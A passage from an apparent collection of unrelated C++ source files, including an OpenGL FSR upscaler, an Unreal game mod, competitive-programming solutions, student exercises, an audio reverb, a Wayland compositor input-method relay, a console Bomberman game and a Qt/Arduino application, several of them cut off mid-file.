CreateBilinearSampler();\n    framebuffer.Create();\n\n    easu_tex.Create(GL_TEXTURE_2D);\n    glTextureStorage2D(easu_tex.handle, 1, GL_RGBA16F, width, height);\n\n    rcas_tex.Create(GL_TEXTURE_2D);\n    glTextureStorage2D(rcas_tex.handle, 1, GL_RGBA16F, width, height);\n}\n\nFSR::~FSR() = default;\n\nGLuint FSR::Draw(ProgramManager& program_manager, GLuint texture, u32 input_image_width,\n                 u32 input_image_height, const Common::Rectangle<f32>& crop_rect) {\n    const f32 input_width = static_cast<f32>(input_image_width);\n    const f32 input_height = static_cast<f32>(input_image_height);\n    const f32 output_width = static_cast<f32>(width);\n    const f32 output_height = static_cast<f32>(height);\n    const f32 viewport_width = (crop_rect.right - crop_rect.left) * input_width;\n    const f32 viewport_x = crop_rect.left * input_width;\n    const f32 viewport_height = (crop_rect.bottom - crop_rect.top) * input_height;\n    const f32 viewport_y = crop_rect.top * input_height;\n\n    FsrConstants easu_con{};\n    FsrConstants rcas_con{};\n\n    FsrEasuConOffset(easu_con.data() + 0, easu_con.data() + 4, easu_con.data() + 8,\n                     easu_con.data() + 12, viewport_width, viewport_height, input_width,\n                     input_height, output_width, output_height, viewport_x, viewport_y);\n\n    const float sharpening =\n        static_cast<float>(Settings::values.fsr_sharpening_slider.GetValue()) / 100.0f;\n\n    FsrRcasCon(rcas_con.data(), sharpening);\n\n    glProgramUniform4uiv(easu_frag.handle, 0, sizeof(easu_con), easu_con.data());\n    glProgramUniform4uiv(rcas_frag.handle, 0, sizeof(rcas_con), rcas_con.data());\n\n    glFrontFace(GL_CW);\n    glBindFramebuffer(GL_DRAW_FRAMEBUFFER, framebuffer.handle);\n    glNamedFramebufferTexture(framebuffer.handle, GL_COLOR_ATTACHMENT0, easu_tex.handle, 0);\n    glViewportIndexedf(0, 0.0f, 0.0f, output_width, output_height);\n    program_manager.BindPresentPrograms(vert.handle, easu_frag.handle);\n    glBindTextureUnit(0, texture);\n    glBindSampler(0, sampler.handle);\n    glDrawArrays(GL_TRIANGLES, 0, 3);\n\n    glNamedFramebufferTexture(framebuffer.handle, GL_COLOR_ATTACHMENT0, rcas_tex.handle, 0);\n    program_manager.BindPresentPrograms(vert.handle, rcas_frag.handle);\n    glBindTextureUnit(0, easu_tex.handle);\n    glDrawArrays(GL_TRIANGLES, 0, 3);\n\n    return rcas_tex.handle;\n}\n\nbool FSR::NeedsRecreation(const Common::Rectangle<u32>& screen) {\n    return screen.GetWidth() != width || screen.GetHeight() != height;\n}\n\n} // namespace OpenGL\n",
    "// include core.h header\n#include <Mod/CppUserModBase.hpp>\n#include <DynamicOutput/DynamicOutput.hpp>\n#include <Unreal/UObjectGlobals.hpp>\n#include <Unreal/UObject.hpp>\n#include <Unreal/AActor.hpp>\n#include <Unreal/Hooks.hpp>\n#include <Unreal/World.hpp>\n#include <Unreal/UObjectArray.hpp>\n#include <Unreal/UFunction.hpp>\n#include \"core.hpp\"\n\nusing namespace RC;\nusing namespace RC::Unreal;\nusing namespace ArrND::Game;\nnamespace ArrND::Core\n{\n    int foundPlayerHowManyTimes = 0;\n\n    Core::Core()\n    {\n        Output::send<LogLevel::Verbose>(STR(\"Core initialized\"));\n    }\n\n    Core::~Core()\n    {\n    }\n\n    AActor *Core::GetPlayer()\n    {\n        return this->player;\n    }\n\n    void Core::GetPlayerInstanceFromGame()\n    {\n        auto prehook = [](Unreal::UnrealScriptFunctionCallableContext &Context, void *CustomData){};\n\n        auto posthook = [this](Unreal::UnrealScriptFunctionCallableContext &Context, void *CustomData)\n        {\n            auto tempPlayer = UObjectGlobals::FindFirstOf(STR(\"Biped_Player\"));\n\n            // if not null ptr\n            if (tempPlayer != nullptr && !tempPlayer->IsUnreachable())\n            {\n                // increase the number of times we found the player\n                foundPlayerHowManyTimes++;\n\n                if (foundPlayerHowManyTimes == 2)\n                {\n                    Output::send<LogLevel::Verbose>(STR(\"Player found\\n\"));\n                    this->SetPlayer((AActor *)tempPlayer);\n                    foundPlayerHowManyTimes = 0;\n                }\n            }\n        };\n\n        Unreal::UObjectGlobals::RegisterHook(STR(\"/Script/Engine.PlayerController:ClientRestart\"), prehook, posthook, nullptr);\n    }\n\n    void Core::OnUnrealInit() {\n        this->GetPlayerInstanceFromGame();\n        this->bIsInitialized = true;\n        this->SetGame(new Game::Game(this->GetPlayer()));\n\n    }\n\n    void Core::SetPlayer(AActor *player) {\n        this->player = player;\n    }\n\n    bool Core::isInitialized() {\n        return this->bIsInitialized;\n    }\n\n    void Core::SetGame(Game::Game *game) {\n        this->game = game;\n    }\n\n    Game::Game *Core::GetGame() {\n        return this->game;\n    }\n}",
    "\n// solved1\n/*\n#include <iostream>\n#include <vector>\n\nusing namespace std;\n\nint main()\n{\n    ios::sync_with_stdio(0); cin.tie(0); cout.tie(0);\n\n    int t; cin >> t;\n\n    while (t--)\n    {\n        int m; cin >> m;\n        vector<int> sum(m + 1, 0);\n\n        for (int i = 1; i <= m; i++)\n        {\n            int num; cin >> num;\n            sum[i] = sum[i - 1] + num;\n        }\n\n        int end = 1;\n        int ans = sum[m];\n        int value = sum[end] - sum[0];\n\n        int temp_end = 0;\n        int temp_start = 0;\n\n        while (end <= m)\n        {\n\n            int left = temp_end;\n            int right = m;\n            while (left < right)\n            {\n                int mid = (left + right) / 2;\n                if (sum[mid] - sum[temp_start] < value)\n                {\n                    left = mid + 1;\n                }\n                else\n                {\n                    right = mid;\n                }\n            }\n\n            temp_end = left;\n\n            int temp_sum = (temp_end <= m) ? sum[temp_end] - sum[temp_start] : 0;\n\n            if (temp_sum == value)\n            {\n                if (temp_end == m)\n                {\n                    ans = min(ans, value);\n                    break;\n                }\n                temp_start = temp_end;\n            }\n            else\n            {\n                if (++end > m) break;\n                temp_end = end;\n                temp_start = temp_end;\n                value = sum[end] - sum[0];\n            }\n        }\n\n        cout << ans << \"\\n\";\n    }\n}\n\n*/\n\n// solved2\n#include <iostream>\n#include <vector>\n\nusing namespace std;\n\nint main()\n{\n    ios::sync_with_stdio(0); cin.tie(0); cout.tie(0);\n\n    int t; cin >> t;\n\n    while (t--)\n    {\n        int m; cin >> m;\n        vector<int> sum(m + 1, 0);\n\n        for (int i = 1; i <= m; i++)\n        {\n            int num; cin >> num;\n            sum[i] = sum[i - 1] + num;\n        }\n\n        int value = 0;\n        int preValue = -1;\n\n        int start = 0;\n        int end = 1;\n        int point = 1;\n        while (end <= m)\n        {\n            value = sum[end] - sum[start];\n\n            if (value < preValue)\n            {\n                end++;\n            }\n            else if (sum[m] % value == 0 && (preValue == value || preValue == -1))\n            {\n                preValue = value;\n                start = end;\n                end++;\n            }\n            else\n            {\n                start = 0;\n                end = ++point;\n\n                preValue = -1;\n            }\n        }\n\n        cout << value << \"\\n\";\n    }\n}",
    "// AUTHOR: Anjali Tambe\n// PROGRAM: p1.cpp\n// DATE: April 16, 2024\n// PURPOSE: Build recommendation system in which users are able to add member, add book and rate book. Based on the rating,\n// our program recommends which book they might like.\n// INPUT: files\n// PROCESS: BookList.h is header file for BookList.cpp. This class are responsible for storing the books from file or user input.\n// MemberList.h is header file for MemberList.cpp which stores members. RatingList.h is header file for RatingList.cpp which\n// contains user ratings for books\n// OUTPUT: Program displays various output like recommended books, which book they added, what book they rated.\n\n#include <iostream>\n#include \"MemberList.h\"\n#include \"BookList.h\"\n#include \"RatingList.h\"\n\nusing namespace std;\n\nclass Login {\npublic:\n    int account;\n\n    void login(int acc, MemberList *memberList) {\n        account = acc;\n        string memberName = memberList->get(acc);\n        cout << memberName + \", you are logged in! \\n\";\n    }\n\n    void logout() {\n        account = 0;\n    }\n};\n\nvoid recommendBook(int, int **, BookList *, MemberList *);\n// Recommends books to the member based on ratings from other members\n// IN: member id - the ID of the member for whom recommendations are generated\n//     ratings - a 2D array representing ratings of books by members\n//     books - pointer to the BookList object containing book information\n//     members - pointer to the MemberList object containing member information\n// MODIFY: None\n// OUT: None\n\nvoid loggedOutUserMenu(MemberList *, BookList *, RatingList *);\n// This function displays the menu options for a logged-out user and handles the user interactions\n// IN: memberList - pointer to the MemberList object containing member information\n//     bookList - pointer to the BookList object containing book information\n//     ratingList - pointer to the RatingList object containing rating information\n// MODIFY: None\n// OUT: None\n\nvoid addMember(MemberList *);\n// This function adds a new member to the system\n// IN: memberList - pointer to the MemberList object\n// MODIFY: Updates the memberList object with the new member information\n// OUT: None\n\nvoid addBook(BookList *);\n// This function adds a new book to the system\n// IN: bookList - pointer to the BookList object\n// MODIFY: Updates the bookList object with the new book information\n// OUT: None\n\nvoid addRating(BookList *, RatingList *, Login);\n// This function adds a rating for a book given by a specific member\n// IN: bookList - pointer to the BookList object containing book information\n//     ratingList - pointer to the RatingList object containing rating information\n//     login - the Login object representing the currently logged-in user\n// MODIFY: Updates the ratingList object with the new rating information\n// OUT: None\n\nvoid viewRatings(RatingList *, BookList *, MemberList *, int);\n// This function displays ratings for a specific member\n// IN: ratingList - pointer to the RatingList object containing rating information\n//     bookList - pointer to the BookList object containing book information\n//     memberList - pointer to the MemberList object containing member information\n//     id - the ID of the member whose ratings are to be displayed\n// MODIFY: None\n// OUT: None\n\nvoid loggedInUserMenu(Login, MemberList *, BookList *, RatingList *);\n// This function displays the menu options for a logged-in user and handles user interactions\n// IN: login - the Login object representing the currently logged-in user\n//     memberList - pointer to the MemberList object containing member information\n//     bookList - pointer to the BookList object containing book information\n//     ratingList - pointer to the RatingList object containing rating information\n// MODIFY: None\n// OUT: None\n\nint main() {\n    MemberList *members = new MemberList();\n    BookList *books = new BookList();\n    RatingList *ratings = new RatingList();\n\n    cout << \"\\nWelcome to the Book Recommendation Program.\";\n    cout << \"\\nThis application allows you to get new recommendations\"\n            \"\\nbased on historical ratings. Also, you can\"\n            \"\\nrate a book, add new books and view your all previous ratings.\\n\";\n\n    cout << \"\\nEnter books file: \";\n    string bookFileName;\n    cin >> bookFileName;\n    books->loadData(bookFileName);\n\n    cout << \"Enter rating file: \";\n    string ratingFileName;\n    cin >> ratingFileName;\n    ratings->loadData(ratingFileName);\n    members->loadData(ratingFileName);\n\n    cout << \"\\n# of books: \" << books->getNumberOfBooks() << endl;\n    cout << \"# of memberList: \" << members->getTotalMembers() << endl;\n\n    loggedOutUserMenu(members, books, ratings);\n    return 0;\n}\n\nvoid recommendBook(int memberId, int **ratings, BookList *books, MemberList *members) {\n    int maxSimilarMember = -1;     // Save max similar member index\n    int maxSimilarityScore = 0;    // Max similarity score\n    int *loggedMemberRating = ratings[memberId];\n    int i = 0;\n    while (i < members->getTo",
    "#include \"daisysp.h\"\n#include \"daisy_seed.h\"\n\n// Interleaved audio definitions\n#define LEFT (i)\n#define RIGHT (i + 1)\n\n// Number of delay lines\n#define LPCF_NUM 8U\n#define APF_NUM 4U\n\nusing namespace daisysp;\nusing namespace daisy;\n\nstatic DaisySeed hw;\n\n// Declare LPF DelayLines\nstatic DelayLine<float, 1U> lpf_del[LPCF_NUM];\n\n// Declare FBCF DelayLines\nstatic DelayLine<float, 4999U + 1U> comb_del[LPCF_NUM];\n\n// Declare APF DelayLines\nstatic DelayLine<float, 557U + 1U> apf_del[APF_NUM];\n\n// Number of primes\n#define PRIMES_NUM 669\n\nconst unsigned short primes[PRIMES_NUM] = {\n2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199,211,223,227,229,233,239,241,251,257,263,269,271,277,281,283,293,307,311,313,317,331,337,347,349,353,359,367,373,379,383,389,397,401,409,419,421,431,433,439,443,449,457,461,463,467,479,487,491,499,503,509,521,523,541,547,557,563,569,571,577,587,593,599,601,607,613,617,619,631,641,643,647,653,659,661,673,677,683,691,701,709,719,727,733,739,743,751,757,761,769,773,787,797,809,811,821,823,827,829,839,853,857,859,863,877,881,883,887,907,911,919,929,937,941,947,953,967,971,977,983,991,\n997,1009,1013,1019,1021,1031,1033,1039,1049,1051,1061,1063,1069,1087,1091,1093,1097,1103,1109,1117,1123,1129,1151,1153,1163,1171,1181,1187,1193,1201,1213,1217,1223,1229,1231,1237,1249,1259,1277,1279,1283,1289,1291,1297,1301,1303,1307,1319,1321,1327,1361,1367,1373,1381,1399,1409,1423,1427,1429,1433,1439,1447,1451,1453,1459,1471,1481,1483,1487,1489,1493,1499,1511,1523,1531,1543,1549,1553,1559,1567,1571,1579,1583,1597,1601,1607,1609,1613,1619,1621,1627,1637,1657,1663,1667,1669,1693,1697,1699,1709,1721,1723,1733,1741,1747,1753,1759,1777,1783,1787,1789,1801,1811,1823,1831,1847,1861,1867,1871,1873,1877,1879,1889,1901,1907,1913,1931,1933,\n1949,1951,1973,1979,1987,1993,1997,1999,2003,2011,2017,2027,2029,2039,2053,2063,2069,2081,2083,2087,2089,2099,2111,2113,2129,2131,2137,2141,2143,2153,2161,2179,2203,2207,2213,2221,2237,2239,2243,2251,2267,2269,2273,2281,2287,2293,2297,2309,2311,2333,2339,2341,2347,2351,2357,2371,2377,2381,2383,2389,2393,2399,2411,2417,2423,2437,2441,2447,2459,2467,2473,2477,2503,2521,2531,2539,2543,2549,2551,2557,2579,2591,2593,2609,2617,2621,2633,2647,2657,2659,2663,2671,2677,2683,2687,2689,2693,2699,2707,2711,2713,2719,2729,2731,2741,2749,2753,2767,2777,2789,2791,2797,2801,2803,2819,2833,2837,2843,2851,2857,2861,2879,2887,2897,2903,2909,2917,2927,\n2939,2953,2957,2963,2969,2971,2999,3001,3011,3019,3023,3037,3041,3049,3061,3067,3079,3083,3089,3109,3119,3121,3137,3163,3167,3169,3181,3187,3191,3203,3209,3217,3221,3229,3251,3253,3257,3259,3271,3299,3301,3307,3313,3319,3323,3329,3331,3343,3347,3359,3361,3371,3373,3389,3391,3407,3413,3433,3449,3457,3461,3463,3467,3469,3491,3499,3511,3517,3527,3529,3533,3539,3541,3547,3557,3559,3571,3581,3583,3593,3607,3613,3617,3623,3631,3637,3643,3659,3671,3673,3677,3691,3697,3701,3709,3719,3727,3733,3739,3761,3767,3769,3779,3793,3797,3803,3821,3823,3833,3847,3851,3853,3863,3877,3881,3889,3907,3911,3917,3919,3923,3929,3931,3943,3947,3967,3989,4001,\n4003,4007,4013,4019,4021,4027,4049,4051,4057,4073,4079,4091,4093,4099,4111,4127,4129,4133,4139,4153,4157,4159,4177,4201,4211,4217,4219,4229,4231,4241,4243,4253,4259,4261,4271,4273,4283,4289,4297,4327,4337,4339,4349,4357,4363,4373,4391,4397,4409,4421,4423,4441,4447,4451,4457,4463,4481,4483,4493,4507,4513,4517,4519,4523,4547,4549,4561,4567,4583,4591,4597,4603,4621,4637,4639,4643,4649,4651,4657,4663,4673,4679,4691,4703,4721,4723,4729,4733,4751,4759,4783,4787,4789,4793,4799,4801,4813,4817,4831,4861,4871,4877,4889,4903,4909,4919,4931,4933,4937,4943,4951,4957,4967,4969,4973,4987,4993,4999\n};\n\nunsigned int selectedPrimes[LPCF_NUM];\n\n//float comb_g = 0.84f;\n\nfloat x, sig_out;\nfloat lpf_y;\nfloat comb_del_out, comb_y, parallel_combs;\nfloat apf_del_out, apf_feedback, apf_y;\nunsigned char idx;\n\n// Potentiometer controls\nfloat wetCV;\nfloat lengthCV;\nfloat densityCV;\nfloat feedbackGainCV;\n\n\nstatic void AudioCallback(AudioHandle::InterleavingInputBuffer  in,\n                          AudioHandle::InterleavingOutputBuffer out,\n                          size_t                                size)\n{\n\n    for(size_t i = 0; i < size; i += 2)\n    {\n\n        x = 0.5f * (in[LEFT] + in[RIGHT]); // mono input\n\n        // Parallel LPCFs\n        parallel_combs = 0;\n        for(idx = 0; idx < LPCF_NUM; idx++) {\n\n            comb_del_out = comb_del[idx].Read();\n            parallel_combs += comb_del_out / LPCF_NUM; // Take output here\n\n\t\t\t// LPF\n            lpf_y = (0.8f * comb_del_out) + (0.2f * lpf_del[idx].Read());\n            lpf_del[idx].Write(lpf_y);\n\n\t\t\t// Comb\n            comb_y = x + (feedbackGainCV * lpf_y);\n            comb_del[idx].Write(comb_y);\n        }\n\n\t\t// Series APFs\n\t\tapf_y = parallel_combs;\n\t\tfor(idx = 0; idx < APF_NUM; idx++) {\n            // APF\n\t\t\tapf_del_out = apf_del[idx].Read();\n\t\t\tapf_feedback = apf_y - (0.7 * apf_del_out);\n\t\t",
    "/*A phone number, such as (212) 767-8900,\r\ncan be thought of as having three parts:\r\nthe area code (212), the exchange (767), and the number (8900).\r\nWrite a program that uses a structure to store these three parts of\r\na phone number separately.\r\nCall the structure phone. Create two structure variables of type\r\nphone. Initialize one, and have the user input a number for the\r\nother one. Then display both numbers. The interchange might\r\nlook like this:\r\nEnter your area code, exchange, and number: 415 555 1212\r\nMy number is (212) 767-8900\r\nYour number is (415) 555-1212*/\r\n#include<iostream>\r\nusing namespace std;\r\nstruct phone\r\n{\r\n\tint\tareacode,exchange,number;\r\n}p1,p2;\r\nmain()\r\n{\r\n\tp1.areacode=212;\r\n\tp1.exchange=767;\r\n\tp1.number=8900;\r\n\tcout<<\"\\nEnter the values of p2's areacode,exchange and number\";\r\n\tcin>>p2.areacode>>p2.exchange>>p2.number;\r\n\tcout<<\"\\nMy number is (\"<<p1.areacode<<\") \"<<p1.exchange<<\"-\"<<p1.number;\r\n\tcout<<\"\\nyour number is (\"<<p2.areacode<<\")  \"<<p2.exchange<<\"-\"<<p2.number;\r\n}\r\n\r\n\r\n",
    "#include \"InputMethodRelay.hpp\"\n#include \"InputManager.hpp\"\n#include \"../../Compositor.hpp\"\n\nCInputMethodRelay::CInputMethodRelay() {\n    g_pHookSystem->hookDynamic(\"keyboardFocus\", [&](void* self, SCallbackInfo& info, std::any param) { onKeyboardFocus(std::any_cast<wlr_surface*>(param)); });\n}\n\nvoid CInputMethodRelay::onNewIME(wlr_input_method_v2* pIME) {\n    if (m_pWLRIME) {\n        Debug::log(ERR, \"Cannot register 2 IMEs at once!\");\n\n        wlr_input_method_v2_send_unavailable(pIME);\n\n        return;\n    }\n\n    m_pWLRIME = pIME;\n\n    hyprListener_IMECommit.initCallback(\n        &m_pWLRIME->events.commit,\n        [&](void* owner, void* data) {\n            const auto PTI  = getFocusedTextInput();\n            const auto PIMR = (CInputMethodRelay*)owner;\n\n            if (!PTI) {\n                Debug::log(LOG, \"No focused TextInput on IME Commit\");\n                return;\n            }\n\n            PTI->updateIMEState(PIMR->m_pWLRIME);\n        },\n        this, \"IMERelay\");\n\n    hyprListener_IMEDestroy.initCallback(\n        &m_pWLRIME->events.destroy,\n        [&](void* owner, void* data) {\n            m_pWLRIME = nullptr;\n\n            hyprListener_IMEDestroy.removeCallback();\n            hyprListener_IMECommit.removeCallback();\n            hyprListener_IMEGrab.removeCallback();\n            hyprListener_IMENewPopup.removeCallback();\n\n            m_pKeyboardGrab.reset(nullptr);\n\n            const auto PTI = getFocusedTextInput();\n\n            Debug::log(LOG, \"IME Destroy\");\n\n            if (PTI)\n                PTI->leave();\n        },\n        this, \"IMERelay\");\n\n    hyprListener_IMEGrab.initCallback(\n        &m_pWLRIME->events.grab_keyboard,\n        [&](void* owner, void* data) {\n            Debug::log(LOG, \"IME TextInput Keyboard Grab new\");\n\n            m_pKeyboardGrab.reset(nullptr);\n\n            m_pKeyboardGrab = std::make_unique<SIMEKbGrab>();\n\n            m_pKeyboardGrab->pKeyboard = wlr_seat_get_keyboard(g_pCompositor->m_sSeat.seat);\n\n            const auto PKBGRAB = (wlr_input_method_keyboard_grab_v2*)data;\n\n            m_pKeyboardGrab->pWlrKbGrab = PKBGRAB;\n\n            wlr_input_method_keyboard_grab_v2_set_keyboard(m_pKeyboardGrab->pWlrKbGrab, m_pKeyboardGrab->pKeyboard);\n\n            m_pKeyboardGrab->hyprListener_grabDestroy.initCallback(\n                &PKBGRAB->events.destroy,\n                [&](void* owner, void* data) {\n                    m_pKeyboardGrab->hyprListener_grabDestroy.removeCallback();\n\n                    Debug::log(LOG, \"IME TextInput Keyboard Grab destroy\");\n\n                    m_pKeyboardGrab.reset(nullptr);\n                },\n                m_pKeyboardGrab.get(), \"IME Keyboard Grab\");\n        },\n        this, \"IMERelay\");\n\n    hyprListener_IMENewPopup.initCallback(\n        &m_pWLRIME->events.new_popup_surface,\n        [&](void* owner, void* data) {\n            m_vIMEPopups.emplace_back(std::make_unique<CInputPopup>((wlr_input_popup_surface_v2*)data));\n\n            Debug::log(LOG, \"New input popup\");\n        },\n        this, \"IMERelay\");\n\n    if (!g_pCompositor->m_pLastFocus)\n        return;\n\n    for (auto& ti : m_vTextInputs) {\n        if (ti->client() != wl_resource_get_client(g_pCompositor->m_pLastFocus->resource))\n            continue;\n\n        if (ti->isV3())\n            ti->enter(g_pCompositor->m_pLastFocus);\n        else\n            ti->onEnabled(g_pCompositor->m_pLastFocus);\n    }\n}\n\nvoid CInputMethodRelay::setIMEPopupFocus(CInputPopup* pPopup, wlr_surface* pSurface) {\n    pPopup->onCommit();\n}\n\nvoid CInputMethodRelay::removePopup(CInputPopup* pPopup) {\n    std::erase_if(m_vIMEPopups, [pPopup](const auto& other) { return other.get() == pPopup; });\n}\n\nSIMEKbGrab* CInputMethodRelay::getIMEKeyboardGrab(SKeyboard* pKeyboard) {\n\n    if (!m_pWLRIME)\n        return nullptr;\n\n    if (!m_pKeyboardGrab.get())\n        return nullptr;\n\n    const auto VIRTKB = wlr_input_device_get_virtual_keyboard(pKeyboard->keyboard);\n\n    if (VIRTKB && (wl_resource_get_client(VIRTKB->resource) == wl_resource_get_client(m_pKeyboardGrab->pWlrKbGrab->resource)))\n        return nullptr;\n\n    return m_pKeyboardGrab.get();\n}\n\nCTextInput* CInputMethodRelay::getFocusedTextInput() {\n    if (!g_pCompositor->m_pLastFocus)\n        return nullptr;\n\n    for (auto& ti : m_vTextInputs) {\n        if (ti->focusedSurface() == g_pCompositor->m_pLastFocus)\n            return ti.get();\n    }\n\n    return nullptr;\n}\n\nvoid CInputMethodRelay::onNewTextInput(wlr_text_input_v3* pInput) {\n    m_vTextInputs.emplace_back(std::make_unique<CTextInput>(pInput));\n}\n\nvoid CInputMethodRelay::onNewTextInput(STextInputV1* pTIV1) {\n    m_vTextInputs.emplace_back(std::make_unique<CTextInput>(pTIV1));\n}\n\nvoid CInputMethodRelay::removeTextInput(CTextInput* pInput) {\n    std::erase_if(m_vTextInputs, [pInput](const auto& other) { return other.get() == pInput; });\n}\n\nvoid CInputMethodRelay::updateAllPopups() {\n    for (auto& p : m_vIMEPopups) {\n        p->onCommit();\n    }\n}\n\nvoid CInputMethodRelay::activateIME(CTextInput* pInput) {\n    i",
    "#include <iostream>\n#include <windows.h>\n#include <conio.h>\n#include <time.h>\n#include <vector>\n#include <chrono>\n#include <locale.h>\n\nusing namespace std;\nusing namespace std::chrono;\n\n// Estrutura para o display in game\nstruct Display {\n    float tempo;\n    int movimento;\n    int qtdBombas;\n};\n\n// Estrutura para representar os inimigos\nstruct Inimigo\n{\n    int x;\n    int y;\n};\n\n// Estrutura para representar os jogadores\nstruct Jogador\n{\n    short int x;\n    short int y;\n    short int vidas = 1;\n    short int maximoBombas = 1;\n    bool resisteBomba = false;\n    bool raioBomba = 1;\n    bool bombaRelogio = false;\n    bool noclip = false;\n    bool noclipBomba = false;\n};\n\n// Estrutura para representar as bombas\nstruct Bomba\n{\n    bool ativa;\n    short int x;\n    short int y;\n};\n\n\n// Fun\u00e7\u00e3o para verificar se o movimento \u00e9 v\u00e1lido\n\nbool verificaMovimento(int m[][15], int x, int y)\n{\n    if (m[x][y] == 8){\n        return m[x][y];\n    }\n    return m[x][y] == 0;\n}\n\n//bool chancePowerUp ()\n//{\n//    int chance = rand() % 100+1;\n//    if (chance < 100)\n//    {\n//        return true;\n//    }\n//    else {\n//\n//        return false;\n//    }\n//\n//}\n\n//int powerUp()\n//{\n//    chancePowerUp();\n//    if (chancePowerUp)\n//     int tipoPowerUp = 2; //0 para aumento da quantidade de bombas, 1 vida extra, 2 para invencibilidade contra bomba e 3 para atravessar blocos quebraveis\n//        return tipoPowerUp;\n//\n//}\n//bool resisteBomba()\n//{\n//    int tipo = powerUp();\n//    if (tipo == 2){\n//        return resisteBomba;\n//\n//    }\n//    else {\n//        return false;\n//    }\n//}\n\n// Fun\u00e7\u00e3o para mover os inimigos\n\nvoid moverInimigos(int m[][15], vector<Inimigo>& inimigos)\n{\n    for (auto& inimigo : inimigos)\n    {\n        int dir = rand() % 4; // 0 para cima, 1 para baixo, 2 para esquerda, 3 para direita\n        switch (dir)\n        {\n        case 0:\n            if (verificaMovimento(m, inimigo.x - 1, inimigo.y))\n            {\n                inimigo.x--;\n            }\n            break;\n        case 1:\n            if (verificaMovimento(m, inimigo.x + 1, inimigo.y))\n            {\n                inimigo.x++;\n            }\n            break;\n        case 2:\n            if (verificaMovimento(m, inimigo.x, inimigo.y - 1))\n            {\n                inimigo.y--;\n            }\n            break;\n        case 3:\n            if (verificaMovimento(m, inimigo.x, inimigo.y + 1))\n            {\n                inimigo.y++;\n            }\n            break;\n        }\n    }\n\n}\n\n// Fun\u00c3\u00a7\u00c3\u00a3o para definir o estado do jogo\nvoid definirJogo(int m[][15], const vector<Inimigo>& inimigos, const Jogador& jogador, const Bomba& bomba, int& contadorPiscadasBomba, const Display& ingameDisplay)\n{\n    COORD coord;\n    coord.X = 0;\n    coord.Y = 0;\n    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);\n\n    for (int i = 0; i < 15; i++)\n    {\n        for (int j = 0; j < 15; j++)\n        {\n            if (i == jogador.x && j == jogador.y)\n            {\n                cout << char(36);\n            }\n            else if (bomba.x == i && bomba.y == j && bomba.ativa && contadorPiscadasBomba % 2 == 0)\n            {\n                cout << char(184); // Exibe a bomba se o contador de piscadas for par\n            }\n            else\n            {\n                bool verificaInimigo = false;\n                for (const auto& inimigo : inimigos)\n                {\n                    if (i == inimigo.x && j == inimigo.y)\n                    {\n                        cout << char(159);\n                        verificaInimigo = true;\n                        break;\n                    }\n                }\n                if (!verificaInimigo)\n\n                {\n                    switch (m[i][j])\n                    {\n                    case 0:\n                        cout << \" \";\n                        break;\n                    case 1:\n                        cout << char(219);\n                        break;\n                    case 2:\n                        cout << char(35);\n                        break; // Paredes quebr\u00c3\u00a1veis\n                    case 3:\n                        cout << char(157);\n                        break; // bomba\n                    case 4:\n                        cout << char(159);\n                        break; // Inimigo\n                    case 5:\n                        cout << char(36);\n                        break; // Jogador\n                    case 7:\n                        cout << char(134);\n\n                        break; // explos\u00e3o\n                    case 8:\n                        cout << char(5);\n                        break; //powerup\n                    case 9:\n                        cout << char(75);\n                        break;\n                    case 10:\n                        cout << char(75);\n                        break;\n                    case 11:\n                        cout << char(75);\n                        break;\n                    case 12:\n                        cout << char(75);\n    ",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include \"employee.h\"\n#include \"aides.h\"\n#include \"event.h\"\n#include \"restaurant.h\"\n#include \"user.h\"\n#include \"arduino.h\"\n#include <QMovie>\n#include <QDateEdit>\n#include <QMessageBox>\n#include <QTableView>\n#include <QLabel>\n#include <QComboBox>\n#include <QDebug>\n#include <QPrinter>\n#include <QPainter>\n#include <QStandardPaths>\n#include <QPixmap>\n#include <QPrintDialog>\n#include <QtNetwork/QSslSocket>\n#include <QtNetwork/QSslConfiguration>\n#include <QtNetwork/QSsl>\n#include <QtNetwork/QTcpSocket>\n#include <QtNetwork/QHostInfo>\n#include \"qrcodegen.hpp\"\n#include <QAxBase>\n#include <QAxObject>\n#include <mshtml.h>\n#include <QtWidgets>\n#include <QNetworkAccessManager>\n#include <QNetworkRequest>\n#include <QNetworkReply>\n#include <QEventLoop>\n#include <QtNetwork>\n#include <QSslSocket>\n#include \"messengerlanclient.h\"\n#include \"messengerserver.h\"\n#include \"calculator.h\"\nusing namespace chatbox;\n\n#define file_rx \"[A-z0-9]+(\\\\.(jpg|png|gif|jpeg|jfif))\"\n\n\nEvent ev;\nMainWindow::MainWindow(QWidget * parent): QMainWindow(parent), ui(new Ui::MainWindow) {\n\n  ui -> setupUi(this);\n\n  int ret = A.connect_arduino(); // lancer la connexion \u00e0 arduino\n    switch (ret) {\n    case (0):\n      qDebug() << \"arduino is available and connected to : \" << A.getarduino_port_name();\n      break;\n    case (1):\n      qDebug() << \"arduino is available but not connected to :\" << A.getarduino_port_name();\n      break;\n    case (-1):\n      qDebug() << \"arduino is not available\";\n    }\n\n    QObject::connect(A.getserial(), SIGNAL(readyRead()), this, SLOT(update_label())); // permet de lancer\n\n    //le slot update_label suite \u00e0 la reception du signal readyRead (reception des donn\u00e9es\n\n    qDebug() << \"=============\" + A.getarduino_port_name();\n\n    QObject::connect(A.getserial(), SIGNAL(readyRead()), this, SLOT(update_label())); // permet de lancer\n    QSerialPort * serialPtr = A.getserial();\n\n    if (!serialPtr) {\n      qDebug() << \"Error: Unable to get a pointer to QSerialPort object\";\n      return;\n    }\n    if (!serialPtr -> isOpen()) {\n\n      serialPtr -> setPortName(A.getarduino_port_name()); // replace with the name of your serial port\n      serialPtr -> setBaudRate(QSerialPort::Baud9600);\n      serialPtr -> setDataBits(QSerialPort::Data8);\n      serialPtr -> setParity(QSerialPort::NoParity);\n      serialPtr -> setStopBits(QSerialPort::OneStop);\n      serialPtr -> setFlowControl(QSerialPort::NoFlowControl);\n\n      if (serialPtr -> open(QIODevice::ReadWrite)) {\n        qDebug() << \"Serial port opened successfully!\";\n      } else {\n        qDebug() << \"Failed to open serial port!\";\n        return;\n      }\n    }\n\n//*************************************\n  QTableView * Tableviewem = ui -> stackedWidget_2 -> findChild < QTableView * > (\"tableView_em\");\n  Tableviewem -> setModel(Etmp.afficher_em());\n\n  QTableView * Tableviewads = ui -> stackedWidget_2 -> findChild < QTableView * > (\"tableViewads\");\n  Tableviewads -> 